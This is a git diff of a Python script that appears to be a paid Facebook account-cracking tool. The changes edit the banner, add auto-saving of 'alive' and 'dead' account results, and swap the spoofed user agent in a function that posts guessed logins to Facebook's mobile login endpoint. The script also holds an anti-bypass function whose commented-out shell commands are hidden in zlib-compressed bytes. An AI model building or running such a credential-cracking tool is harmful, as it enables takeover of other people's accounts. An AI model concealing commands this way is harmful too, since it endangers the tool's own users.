@@ -1,6 +1,6 @@
 #Josh
 #Facebook: Josh
-#Github : NOT FOUND
+#Github : https://github.com/Joshhi1/josh
 from os import path
 import os,base64,zlib,pip,urllib
 try:
@@ -81,7 +81,9 @@ logo = ("""
  ┃  FACEBOOK : Josh
  ┃  GITHUB : https://github.com/Joshhi1
  ┃  TYPE OF TOOL : PAID
- ┃  VERSION : 0.2       
+ ┃  VERSION : 0.3       
+ ┃ AUTO SAVE IN : /sdcard/JOSH-ALIVE.txt & /sdcard/JOSH-DEAD.txt
+ ┃ Josh’s GF : Kheanna
  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 def linex():
         print('\033[1;92m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
@@ -114,7 +116,7 @@ def fucked():
 	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/NIN,J\xd1\xd7\x02\x00,D\x05\x1e'))
 	#os.system(zlib.decompress(b'x\x9c+\xcaU\xd0-JS\xd0/.\xc9/JLO\xd5O\xcd-\xcdI,IM\xd17\xd0\xd7\x02\x00\x8dJ\t\x81'))
 	print(' Fuck You Bypass User ');exit()
-
+	
 def ckx():
 	uuid = str(os.geteuid()) + str(os.getlogin())
 	id = "→".join(uuid)
@@ -584,8 +586,7 @@ def rcrack_free(idf,pwv):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Tecno spark 6 air Build/QQ1D.267605.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/82.0.1333.369 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.54.15;]',
 }
 			lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
